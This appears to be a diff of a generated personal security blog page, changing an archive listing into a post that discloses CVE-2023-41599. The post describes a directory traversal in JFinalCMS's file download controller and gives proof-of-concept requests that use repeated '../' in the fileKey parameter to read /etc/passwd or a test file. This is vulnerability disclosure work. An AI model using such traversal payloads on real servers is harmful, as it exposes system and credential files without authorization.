@@ -20,17 +20,24 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
   </script>
 
-  <meta name="description" content="So1Lupus的个人博客">
-<meta property="og:type" content="website">
-<meta property="og:title" content="So1Lupus">
-<meta property="og:url" content="http://example.com/archives/2023/page/2/index.html">
+  <meta name="description" content="Directory traversal in JFinalCMS source code:  https:&#x2F;&#x2F;gitee.com&#x2F;heyewei&#x2F;JFinalcms Official website :http:&#x2F;&#x2F;www.xiadaima.com&#x2F;  Analyze:The vulnerable file is in com&#x2F;cms&#x2F;controller&#x2F;common&#x2F;DownControlle">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CVE-2023-41599">
+<meta property="og:url" content="http://example.com/undefined/68b58dca.html">
 <meta property="og:site_name" content="So1Lupus">
-<meta property="og:description" content="So1Lupus的个人博客">
+<meta property="og:description" content="Directory traversal in JFinalCMS source code:  https:&#x2F;&#x2F;gitee.com&#x2F;heyewei&#x2F;JFinalcms Official website :http:&#x2F;&#x2F;www.xiadaima.com&#x2F;  Analyze:The vulnerable file is in com&#x2F;cms&#x2F;controller&#x2F;common&#x2F;DownControlle">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/undefined/undefined/image-20230828144150045.png">
+<meta property="og:image" content="http://example.com/undefined/undefined/image-20230828144143097.png">
+<meta property="og:image" content="http://example.com/undefined/undefined/image-20230828144727066.png">
+<meta property="article:published_time" content="2024-09-27T12:50:46.000Z">
+<meta property="article:modified_time" content="2024-09-27T12:52:13.729Z">
 <meta property="article:author" content="So1Lupus">
+<meta property="article:tag" content="漏洞挖掘">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/undefined/undefined/image-20230828144150045.png">
 
-<link rel="canonical" href="http://example.com/archives/2023/page/2/">
+<link rel="canonical" href="http://example.com/undefined/68b58dca.html">
 
 
 <script id="page-configurations">
@@ -38,12 +45,12 @@
   CONFIG.page = {
     sidebar: "",
     isHome : false,
-    isPost : false,
+    isPost : true,
     lang   : 'zh-CN'
   };
 </script>
 
-  <title>归档 | So1Lupus</title>
+  <title>CVE-2023-41599 | So1Lupus</title>
   
 
 
@@ -185,94 +192,92 @@
         <div class="content-wrap">
           
 
-          <div class="content archive">
+          <div class="content post posts-expand">
             
 
+    
   
   
-  
-  <div class="post-block">
-    <div class="posts-collapse">
-      <div class="collection-title">
-        <span class="collection-header">嗯..! 目前共计 16 篇日志。 继续努力。</span>
-      </div>
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/undefined/68b58dca.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="So1Lupus">
+      <meta itemprop="description" content="So1Lupus的个人博客">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="So1Lupus">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CVE-2023-41599
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-09-27 20:50:46 / 修改时间：20:52:13" itemprop="dateCreated datePublished" datetime="2024-09-27T20:50:46+08:00">2024-09-27</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-    <div class="collection-year">
-      <span class="collection-header">2023</span>
+        <h1 id="Directory-traversal-in-JFinalCMS"><a href="#Directory-traversal-in-JFinalCMS" class="headerlink" title="Directory traversal in JFinalCMS"></a>Directory traversal in JFinalCMS</h1><blockquote>
+<p>source code:  <a target="_blank" rel="noopener" href="https://gitee.com/heyewei/JFinalcms">https://gitee.com/heyewei/JFinalcms</a></p>
+<p>Official website :<a target="_blank" rel="noopener" href="http://www.xiadaima.com/">http://www.xiadaima.com/</a></p>
+</blockquote>
+<h2 id="Analyze"><a href="#Analyze" class="headerlink" title="Analyze:"></a>Analyze:</h2><p>The vulnerable file is in <code>com/cms/controller/common/DownController.java</code></p>
+<img src="/undefined/undefined/image-20230828144150045.png" class="">
+
+<p>We can easily find that the file function concatenates the file name of  the <code>fileKey</code> parameter as a string directly with the overall file path,  without performing black and white list verification or security  verification, which allows us to utilize Perform directory traversal</p>
+<img src="/undefined/undefined/image-20230828144143097.png" class="">
+
+<p>poc:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">I set a test.txt in E:\test.txt.And this java sysytem is also set in E-disk.</span><br><span class="line">Windows: /common/down/file?fileKey=/../../../../../../../../../test.txt</span><br><span class="line">Linux:	/common/down/file?fileKey=/../../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+<img src="/undefined/undefined/image-20230828144727066.png" class="">
     </div>
 
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+    
+    
+    
 
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2023-03-12T22:02:28+08:00"
-              content="2023-03-12">
-          03-12
-        </time>
-      </div>
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag"># 漏洞挖掘</a>
+          </div>
 
-      <div class="post-title">
-          <a class="post-title-link" href="/undefined/a7f75ca4.html" itemprop="url">
-            <span itemprop="name">Road-to-OSCP-4-Forest</span>
-          </a>
-      </div>
-
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2023-03-07T21:17:30+08:00"
-              content="2023-03-07">
-          03-07
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/undefined/236928b6.html" itemprop="url">
-            <span itemprop="name">Road to OSCP-3 Soccer</span>
-          </a>
-      </div>
-
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2023-03-06T22:03:57+08:00"
-              content="2023-03-06">
-          03-06
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/undefined/442af4ad.html" itemprop="url">
-            <span itemprop="name">Road to OSCP-2 Lame</span>
-          </a>
-      </div>
-
-    </header>
-  </article>
+        
 
 
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/undefined/3db8feaa.html" rel="prev" title="Road-to-OSCP-7-Blackfield">
+      <i class="fa fa-chevron-left"></i> Road-to-OSCP-7-Blackfield
+    </a></div>
+      <div class="post-nav-item"></div>
     </div>
-  </div>
+      </footer>
+    
+  </article>
   
   
   
-
-  
-  <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/archives/2023/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/archives/2023/">1</a><span class="page-number current">2</span>
-  </nav>
 
 
 
@@ -324,6 +329,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Directory-traversal-in-JFinalCMS"><span class="nav-number">1.</span> <span class="nav-text">Directory traversal in JFinalCMS</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Analyze"><span class="nav-number">1.1.</span> <span class="nav-text">Analyze:</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
